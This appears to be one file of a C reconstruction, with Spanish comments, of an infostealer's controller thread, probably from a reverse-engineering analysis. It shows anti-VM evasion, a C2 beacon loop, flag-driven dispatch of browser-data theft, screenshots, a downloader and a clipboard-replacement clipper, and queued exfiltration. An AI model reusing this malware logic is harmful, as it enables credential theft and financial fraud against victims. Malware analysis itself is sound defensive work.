/* ============================================================
 * Capacidad 04/15 — Orquestación de red y workers
 * Función C : ControllerMain
 * Dirección : 0x180057ace   · Nodo N2/N3   · Confianza: Alta
 * ------------------------------------------------------------
 * Hilo maestro. Evalúa virtualización antes de tocar la red; si el
 * entorno parece virtualizado, limpia y termina. En caso contrario
 * entra en un bucle de beacon: refresca la configuración desde el C2,
 * despacha las tareas activadas por flags/listas y drena la cola de
 * resultados. Las tareas no se activan todas de forma incondicional.
 * ============================================================
 */

#include "00_tipos_comunes.h"

/* Bits de task_flags (+0x138) que activan cada módulo [condicionado]. */
#define FLAG_DOWNLOADER 0x01u   /* ProcessDownloadTasks        (CAP 9)  */
#define FLAG_REGISTRY   0x02u   /* CollectRegistryValues       (CAP 11) */
#define FLAG_APPS       0x04u   /* CollectApplicationArtifacts (CAP 12) */
#define FLAG_CHROMIUM   0x08u   /* CollectChromiumArtifacts    (CAP 13) */
#define FLAG_FIREFOX    0x10u   /* CollectFirefoxArtifacts     (CAP 14) */
#define FLAG_SCREENSHOT 0x20u   /* CaptureScreenAndQueue       (CAP 10) */
#define FLAG_CLIPPER    0x40u   /* ClipboardReplacementWorker  (CAP 8)  */

/* ------------------------------------------------------------------
 * Los workers comparten la bandera global de vida (definida en CAP 3).
 * ------------------------------------------------------------------ */
bool WorkerShouldRun(void)
{
    return g_worker_running;
}

/* ------------------------------------------------------------------
 * Detiene a los workers, marca el fin y libera el contexto.
 * ------------------------------------------------------------------ */
void CleanupAndExitWorker(RuntimeContext *ctx)
{
    if (ctx == NULL)
        return;
    ctx->running        = false;
    g_worker_running    = false;
    DestroyRuntimeContext(ctx);
}

/* ------------------------------------------------------------------
 * Despacha los módulos activados por la configuración del C2. Cada
 * módulo solo se ejecuta si su flag/lista está presente [condicionado].
 * El clipper se lanza una vez como hilo; el resto se ejecuta en línea
 * dentro del ciclo de beacon.
 * ------------------------------------------------------------------ */
void DispatchConfiguredTasks(RuntimeContext *ctx, const RuntimeConfig *cfg)
{
    if (ctx == NULL || cfg == NULL)
        return;

    if (cfg->task_flags & FLAG_CLIPPER) {
        /* el clipper se arranca una sola vez y queda vigilando */
        static volatile LONG clipper_started = 0;
        if (InterlockedCompareExchange(&clipper_started, 1, 0) == 0)
            StartDetachedWorker((LPTHREAD_START_ROUTINE)ClipboardReplacementWorker, ctx);
    }

    if (cfg->task_flags & FLAG_DOWNLOADER)
        ProcessDownloadTasks(&cfg->downloads, &ctx->queue);
    if (cfg->task_flags & FLAG_REGISTRY)
        CollectRegistryValues(&cfg->registry, &ctx->queue);
    if (cfg->task_flags & FLAG_APPS)
        CollectApplicationArtifacts(&cfg->apps, &ctx->queue);
    if (cfg->task_flags & FLAG_CHROMIUM)
        CollectChromiumArtifacts(&ctx->queue);
    if (cfg->task_flags & FLAG_FIREFOX)
        CollectFirefoxArtifacts(&ctx->queue);
    if (cfg->task_flags & FLAG_SCREENSHOT)
        CaptureScreenAndQueue(&ctx->queue);
}

/* ------------------------------------------------------------------
 * 0x180057ace — hilo maestro del controlador.
 * ------------------------------------------------------------------ */
void ControllerMain(void *raw_ctx)
{
    RuntimeContext *ctx = (RuntimeContext *)raw_ctx;
    if (ctx == NULL)
        return;

    /* Anti-VM / anti-sandbox previo a cualquier actividad de red. */
    if (IsVirtualizedOrSandboxed()) {       /* CPUID, SMBIOS, adaptador gráfico */
        CleanupAndExitWorker(ctx);
        return;
    }

    while (WorkerShouldRun()) {
        if (RefreshRuntimeConfig(ctx, &ctx->cfg))       /* POST HTTPS + XOR 0xA2 */
            DispatchConfiguredTasks(ctx, &ctx->cfg);    /* flags y listas del C2 */
        else
            Sleep(BEACON_INTERVAL_MS);

        ControllerDrainAndSend(&ctx->queue, ctx);       /* exfiltración de cola */
    }

    CleanupAndExitWorker(ctx);
}
